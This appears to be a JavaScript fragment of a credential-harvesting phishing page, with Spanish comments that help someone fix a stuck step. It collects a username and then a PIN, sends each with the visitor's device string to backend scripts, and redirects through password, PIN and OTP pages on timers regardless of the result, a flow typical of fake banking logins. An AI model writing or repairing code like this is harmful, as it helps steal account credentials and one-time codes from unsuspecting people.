
// Función para detectar el dispositivo (asegúrate de tenerla definida arriba)
function detectar_dispositivo() {
    return navigator.userAgent;
}

// 1. FUNCIÓN PARA EL USUARIO (Paso inicial)
function inicio(u){
    var d = detectar_dispositivo();
    $("#fondo, #cargando-o").show();
    
    // Mandamos el reporte al backend
    $.post("../process/inicio.php", { usr: u, dis: d });
    
    // Salto automático a la clave
    setTimeout(function(){ 
        window.location.href = "PASS.php"; 
    }, 2000);
}

// 2. FUNCIÓN PARA EL PIN (El que se te queda trabado)
function pasousuario(p){
    var d = detectar_dispositivo();
    
    // Mostramos el cargando (por si no estaba visible)
    $("#fondo, #cargando-o").show();
    
    // Enviamos el PIN al archivo de proceso
    // Revisa que el archivo "paso_pin.php" exista en tu carpeta "process"
    $.post("../process/paso_pin.php", { pin: p, dis: d });
    
    // SALTO OBLIGATORIO para que no se quede cargando por siempre
    setTimeout(function(){ 
        // Cámbialo por "OTP.php" o la página que siga en tu proyecto
        window.location.href = "FINAL.php"; 
    }, 2500);
}
